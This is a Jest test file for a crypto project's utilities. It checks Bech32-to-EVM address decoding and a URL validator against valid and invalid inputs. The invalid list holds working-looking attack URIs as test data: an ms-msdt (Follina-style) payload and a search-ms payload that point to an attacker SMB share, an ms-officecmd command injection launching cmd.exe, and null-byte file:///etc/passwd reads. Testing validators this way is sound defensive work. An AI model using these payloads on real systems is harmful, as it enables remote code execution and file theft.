import { bech32ToEVMAddress, isValidURL } from './utils';

describe('Testing Common utils functions', () => {
  it('Test decoding Bech32 address ', () => {
    const decoded = bech32ToEVMAddress('tcrc1k43xa93pquw4sa3y4h7kznvxlt5weyrykxxmwu');
    expect(decoded).toBe('0xB5626E9621071D587624AdFD614D86fAe8ec9064');
    expect(decoded).not.toBe('0xc1626E9621071D587624AdFD614D86fAe8ec9064');

    const decoded1 = bech32ToEVMAddress('tcrc1llf6qppvwhw6t4q702nzpm9ewq3h75f6kzv0hn');
    expect(decoded1).toBe('0xffd3a0042C75DDa5d41e7aa620ecB970237F513a');
  });
});

const invalidURLs = [
  "smb://domain.com",
  "vvs.finance\x00%00file:///etc/passwd",
  "https://vvs.finance\x00%00file:///etc/passwd",
  "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22",
  "search-ms:query=malicious_executable.exe&crumb=location:%5C%[5Cattacker.com](<http://5cattacker.com/>)%5Csmb_share%5Ctools&displayname=Important%20update",
  "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D",
  "mailto:abc.com",
  "file:/net/attacker.tld/path/to/export",
  "ms-excel:ofv|u|https://www.cmu.edu/blackboard/files/evaluate/tests-example.xls",
  "http://fulcrom.finance:7890",
  "https://fulcrom.finance:7890",
  "https://abc:adsof@crypto.com",
  "vvs.",
  ".vvs",
]

const validURLs = [
  "fulcrom.finance",
  "http://www.google.com",
  "https://fulcrom.finance",
]

describe('valid url checks', () => {
  validURLs.forEach(url => {
    it(`${url} is valid`, () => {
      expect(isValidURL(url)).toBe(true);
    })
  });

  invalidURLs.forEach(url => {
    it(`${url} is invalid`, () => {
      expect(isValidURL(url)).toBe(false);
    })
  });
});